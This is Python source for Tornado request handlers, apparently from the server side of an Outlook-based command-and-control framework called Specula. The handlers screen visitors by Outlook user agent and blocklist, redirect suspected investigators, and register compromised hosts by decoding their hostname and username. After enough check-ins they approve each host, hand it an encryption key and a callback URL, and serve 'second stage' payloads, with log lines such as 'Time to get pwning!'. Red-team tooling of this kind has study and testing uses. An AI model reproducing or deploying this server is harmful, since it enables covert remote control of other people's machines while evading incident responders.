import tornado
import base64
from datetime import datetime
from urllib.parse import urlparse
from lib.core.specagents import AgentClass
import copy
from lib.core.setup import gconfig

class ValidateAgentHandler(tornado.web.RequestHandler):
    def set_default_headers(self):
        self.set_header('Server', gconfig.SERVER_HEADER)

    hostname = urlparse(gconfig.DNS_NAME).hostname
    def get(self):
        ### Get User agent and remote ip ###
        user_agent = self.request.headers.get("User-Agent")
        remote_ip = self.request.remote_ip
        self.application.helpers.speclog("*** [INBOUND GET] (" + remote_ip + ") - [URL]: " + self.request.full_url())
        if self.application.helpers.inblocklist(remote_ip) and 'Outlook' not in user_agent:
            self.application.helpers.speclog("*** [blocklisted IP] ({})".format(remote_ip))
            self.redirect(gconfig.REDIRECT_FALSE_AGENTS)
        elif self.application.helpers.inblocklist(remote_ip) and 'Outlook'  in user_agent:
            self.render('blocklist.html',
                        CLSID=gconfig.CLSID)
        elif 'Outlook' in user_agent:
            if self.application.helpers.pastenddate():
                self.application.helpers.speclog("*** [ENDDATE] (" + remote_ip + "): Returning Nothing")
                self.render('base.html',
                            REFRESH_TIME=99999,
                            OUTLOOK_VIEW_ID=gconfig.OUTLOOK_VIEW_ID,
                            CLSID=gconfig.CLSID)
                return
            self.application.helpers.speclog("*** [VALIDATION CHECK] (" + remote_ip + "): Valid Useragent")
            self.application.helpers.speclog("*** [VALIDATION CHECK] (" + remote_ip + "): Rendering validation.html")
            hn = urlparse(self.request.full_url()).hostname
            if hn != self.hostname:
                self.application.helpers.speclog("""
*** [WARNING] The Hostname we are returning does not equal the hostname used
    {} != {}""".format(hn, self.hostname))
            self.render('validation.html',
                        DNS=gconfig.DNS_NAME,
                        URL=gconfig.VALIDATE_URL,
                        REFRESH_TIME=self.application.helpers.addJitter(gconfig.JITTER, gconfig.DEFAULT_REFRESH_TIME),
                        OUTLOOK_VIEW_ID=gconfig.OUTLOOK_VIEW_ID,
                        CLSID=gconfig.CLSID,
                        ENCRYPTIONKEY_LOCATION = gconfig.ENCRYPTIONKEY_REGISTRY_LOCATION,
                        ENCRYPTIONKEY_VALUENAME = gconfig.ENCRYPTIONKEY_VALUENAME
                        )
        else:
            self.application.helpers.speclog("*** [ALERT] (" + remote_ip + "): Inbound connection with wrong UserAgent - Useragent: " + user_agent)
            if gconfig.REDIRECT_FALSE_AGENTS.lower() == "template":
                self.application.helpers.speclog("*** [ALERT] (" + remote_ip + "): REDIRECTING to template **Evil laugh**")
                self.render('redirect_template.html')
            else:
                self.application.helpers.speclog("*** [ALERT] (" + remote_ip + "): REDIRECTING to " + gconfig.REDIRECT_FALSE_AGENTS + " **Evil laugh**")
                self.redirect(gconfig.REDIRECT_FALSE_AGENTS)

    def post(self):
        user_agent = self.request.headers.get("User-Agent")
        remote_ip = self.request.remote_ip
        self.application.helpers.speclog("*** [INBOUND POST] (" + remote_ip + ") - [URL]: " + self.request.full_url())
        if self.application.helpers.inblocklist(remote_ip) or self.application.helpers.pastenddate():
            self.application.helpers.speclog("*** [blocklisted IP or ENDDATE] ({}): attempted post request".format(remote_ip))
            self.set_status(404)
        elif 'Outlook' in user_agent:
            self.application.helpers.speclog("*** [VALIDATION CHECK] (" + remote_ip + "): Valid Useragent")
            try:
                sessionid = tornado.escape.json_decode(self.request.body)
                agent_hostname = copy.deepcopy(sessionid)
                agent_hostname = base64.b64decode(agent_hostname).decode("utf-16le", "ignore").split("|")[0]

                ### CHECK IF IN DB ###
                found = 0
                if self.application.helpers.a_list != []:  # check a_list not empty
                    agent: AgentClass # type anotation
                    for agent in self.application.helpers.a_list:
                        if agent.sessionid == sessionid:
                            agent.update_callback()
                            agent.lastcheckin = datetime.now().strftime(gconfig.TIME_FORMAT)
                            #self.application.helpers.speclog("*** [INITIAL AGENT] - " + agent_hostname + ": Agent already in Database - Outlook most likely needs to be restarted for it to pickup new url")
                            found = 1
                            agent.updateinitialcheckincount(agent.initialcheckincount+1) # Add 1 to checkin count
                            self.application.helpers.speclog("*** [VALIDATION CHECK] (" + remote_ip + ") (" + agent_hostname + "): Increasing Initial Checkin Count")
                            #print(agent.approved)
                            if agent.approved == True:
                                self.application.helpers.speclog("*** [VALIDATION CHECK] (" + remote_ip + ") (" + agent_hostname + "): Agent is approved")
                                if agent.keysent == False:
                                    self.application.helpers.speclog("*** [VALIDATION CHECK] (" + remote_ip + ") (" + agent_hostname + "): Agent is approved - But encryption key not sent")
                                    self.write(agent.encryptionkey + "||" + agent.url)
                                    agent.keysent = True
                                    self.application.helpers.speclog("*** [VALIDATION CHECK] (" + remote_ip + ") (" + agent_hostname + "): Encryption key sent")
                                    if gconfig.PUSH_NEWAGENT == "True":
                                        self.application.helpers.sendPush(agent.remoteip, agent.hostname, "New Fully Authenticated Agent! New URL and Encryption key sent to agent. Time to get pwning!")
                                else:
                                    self.application.helpers.speclog("*** [VALIDATION CHECK] (" + remote_ip + ") (" + agent_hostname + "): Outlook needs to restart to pick up new url")
                            else:
                                self.application.helpers.speclog("*** [VALIDATION CHECK] (" + remote_ip + ") (" + agent_hostname + "): Agent is not approved yet - Checkin Count is too low")
                                #Check if initial checkin count - Set Approved value in DB to true
                                if agent.initialcheckincount == gconfig.INITIAL_CHECKIN_COUNT-1:
                                    self.application.helpers.speclog("*** [VALIDATION CHECK] (" + remote_ip + ") (" + agent_hostname + "): Agent has reached enough checkins - Agent set to Approved")
                                    agent.approved = True
                                    agent.generate_com() #Generate urls and encryption
                                    if gconfig.PUSH_NEWAGENT == "True":
                                        self.application.helpers.sendPush(agent.remoteip, agent.hostname, "New Approved Agent!")

                            self.application.helpers.save_agents_to_file()

                    ### Not found in existing asset db - Register it ###
                    if found == 0:
                        self.application.helpers.speclog("*** [VALIDATION CHECK] (" + remote_ip + ") (" + agent_hostname + "): New Agent - Registering in Database")
                        self.application.helpers.speclog("*** [VALIDATION CHECK] (" + remote_ip + ") (" + agent_hostname + "): Writing post data to agent_data/" + agent_hostname + ".txt")
                        agent_log = open("agent_data/" + agent_hostname + ".txt", "a+")
                        agent_log.write(datetime.now().strftime(gconfig.TIME_FORMAT) + "\n")
                        agent_log.write("Hostname|Username:\n")
                        agent_log.write(base64.b64decode(sessionid).decode("utf-16le", "ignore") + "\n\n")
                        agent_log.close()
                        self.application.helpers.a_list.register_agent(sessionid, remote_ip, user_agent, datetime.now().strftime(gconfig.TIME_FORMAT))
                        self.application.helpers.save_agents_to_file() #UPDATE DB FILE
                        if gconfig.PUSH_VALIDATION == "True":
                            self.application.helpers.sendPush(remote_ip, base64.b64decode(sessionid).decode("utf-16le", "ignore"), "New Validation Ongoing!")
            
                else:  # Empty DB - Register agent
                    self.application.helpers.speclog("*** [VALIDATION CHECK] (" + remote_ip + ") (" + agent_hostname + "): Not in Database - New Agent - Registering in Database")
                    self.application.helpers.speclog("*** [VALIDATION CHECK] (" + remote_ip + ") (" + agent_hostname + "): Writing post data to agent_data/" + agent_hostname + ".txt")
                    agent_log = open("agent_data/" + agent_hostname + ".txt", "a+")
                    agent_log.write(datetime.now().strftime(gconfig.TIME_FORMAT) + "\n")
                    agent_log.write("Hostname|Username:\n")
                    agent_log.write(agent_hostname) ## Add username
                    agent_log.write(base64.b64decode(sessionid).decode("utf-16le", "ignore") + "\n\n")
                    agent_log.close()
                    self.application.helpers.a_list.register_agent(sessionid, remote_ip, user_agent, datetime.now().strftime(gconfig.TIME_FORMAT))
                    self.application.helpers.save_agents_to_file() #UPDATE DB FILE
                    if gconfig.PUSH_VALIDATION == "True":
                        self.application.helpers.sendPush(remote_ip, base64.b64decode(sessionid).decode("utf-16le", "ignore"), "New Validation Ongoing!")
            except ValueError:
                self.application.helpers.speclog("*** [ALERT] (" + remote_ip + ") - POST data sent was invalid - Might be DFIR")
        else:
            self.application.helpers.speclog("*** [ALERT] (" + remote_ip + ") - Invalid Useragent on POST - Something phishy is going on!")
            self.set_status(404)


class UnknownPageHandler(tornado.web.RequestHandler):
    """No Endpoint Handler."""

    def set_default_headers(self):
        self.set_header('Server', gconfig.SERVER_HEADER)

    def get(self):
        ips = [a.remoteip for a in self.application.helpers.a_list]
        if self.request.remote_ip in ips:
            agent = [a for a in self.application.helpers.a_list if a.remoteip == self.request.remote_ip][0]
            paths = [urlparse(a).path for a in agent.otherurls.keys()]
            if self.request.uri in paths:
                self.application.helpers.speclog(
                    "*** [AGENTCOM] (" + agent.remoteip + ") (" + agent.hostname + "): Requesting second stage")
                self.set_header("Cache-Control", "no-store")
                self.write(agent.otherurls.pop(gconfig.DNS_NAME + self.request.uri))
                return
        ### Default Get Handler ###
        self.application.helpers.weblog.warning('Request to Invalid Page from {}'.format(self.request.remote_ip))
        self.application.helpers.speclog("*** [ALERT] (" + self.request.remote_ip + ") - Connection attempt to none Specula url - Possibly DFIR or Internet saying hello")
        if gconfig.PUSH_CONNECTION_OUTSIDESPECULA == "True":
            self.application.helpers.sendPush(self.request.remote_ip, self.request.uri, "Connection attempt outside of Specula")
        self.application.helpers.speclog("*** [ALERT] (" + self.request.remote_ip + ") - [URL]: " + self.request.full_url())
        #self.write('{"status": "ERROR: Unknown API Endpoint."}\n')
        return

### FUNCTIONS ###
